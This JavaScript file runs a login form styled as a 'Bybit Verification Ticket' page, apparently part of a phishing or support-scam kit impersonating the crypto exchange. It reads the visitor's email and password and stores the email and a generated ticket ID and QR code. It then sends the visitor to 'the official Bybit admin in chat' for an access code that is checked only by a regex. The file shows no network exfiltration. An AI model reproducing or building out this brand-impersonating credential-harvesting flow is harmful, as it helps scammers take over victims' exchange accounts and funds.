document.addEventListener('DOMContentLoaded', function() {
    // Check if modalUtils is available
    if (typeof modalUtils === 'undefined') {
        console.error('Modal utilities not loaded');
        return;
    }

    const form = document.getElementById('loginForm');
    if (!form) {
        console.error('Login form not found');
        return;
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        console.log('Login form submitted');

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const issueDescription = document.getElementById('issueDescription').value;

        try {
            // Generate second ticket ID
            console.log('Generating second ticket ID...');
            const ticketId = generateTicketId();
            console.log('Second ticket ID generated:', ticketId);
            
            // Generate QR code with ticket ID
            console.log('Generating QR code...');
            const qrCodeUrl = await generateQRCode(ticketId);
            console.log('QR code generated:', qrCodeUrl);

            // Store ticket information in sessionStorage
            console.log('Storing data in sessionStorage...');
            sessionStorage.setItem('bybitTicketId', ticketId);
            sessionStorage.setItem('bybitQrCodeUrl', qrCodeUrl);
            sessionStorage.setItem('bybitEmail', email);
            sessionStorage.setItem('issueDescription', issueDescription);
            console.log('Data stored successfully');

            // Create and show ticket info
            const ticketInfo = document.createElement('div');
            ticketInfo.className = 'ticket-info';
            ticketInfo.innerHTML = `
                <h3>Bybit Verification Ticket</h3>
                <div class="ticket-details">
                    <p><strong>Ticket ID:</strong> ${ticketId}</p>
                    <div class="qr-code">
                        <img src="${qrCodeUrl}" alt="QR Code" onerror="this.onerror=null; console.error('QR code image failed to load');">
                    </div>
                </div>
                <p class="ticket-instructions">Please provide this ticket information to the official Bybit admin in chat for a six character access code to proceed. Save the QR code for future reference.</p>
                <div class="access-code-section hidden">
                    <div class="form-group">
                        <label for="accessCode">Enter Access Code from Admin</label>
                        <input type="text" id="accessCode" name="accessCode" placeholder="Enter 6-character code" maxlength="6" pattern="[A-Z]{3}[1-9]{3}">
                    </div>
                    <button id="verifyCodeBtn" class="submit-btn">Verify Code</button>
                </div>
                <button id="continueBtn" class="submit-btn" style="margin-top: 20px;">Continue to Verification</button>
            `;

            // Hide the form and show ticket info
            form.style.display = 'none';
            document.querySelector('.card').insertBefore(ticketInfo, document.querySelector('.security-features'));

            // Add event listener to continue button
            document.getElementById('continueBtn').addEventListener('click', function() {
                const accessCodeSection = document.querySelector('.access-code-section');
                accessCodeSection.classList.remove('hidden');
                this.style.display = 'none';
            });

            // Add event listener to verify code button
            document.getElementById('verifyCodeBtn').addEventListener('click', function() {
                const accessCode = document.getElementById('accessCode').value.toUpperCase();
                const codePattern = /^[A-Z]{3}[1-9]{3}$/;

                if (!codePattern.test(accessCode)) {
                    modalUtils.showToast({
                        title: 'Access Denied',
                        message: 'Invalid access code. Please contact the admin in chat for assistance.',
                        type: 'error',
                        duration: 5000
                    });
                    return;
                }

                // Store the verified code
                sessionStorage.setItem('bybitAccessCode', accessCode);
                
                // Show success message before redirecting
                modalUtils.showModal({
                    title: 'Success',
                    message: 'Access code verified successfully. Redirecting...',
                    type: 'success',
                    confirmText: 'Continue',
                    onConfirm: () => {
                        window.location.href = 'thank-you.html';
                    }
                });
            });

        } catch (error) {
            console.error('Error during form submission:', error);
            modalUtils.showModal({
                title: 'Error',
                message: 'An error occurred while processing your request. Please try again.',
                type: 'error',
                confirmText: 'OK'
            });
        }
    });
}); 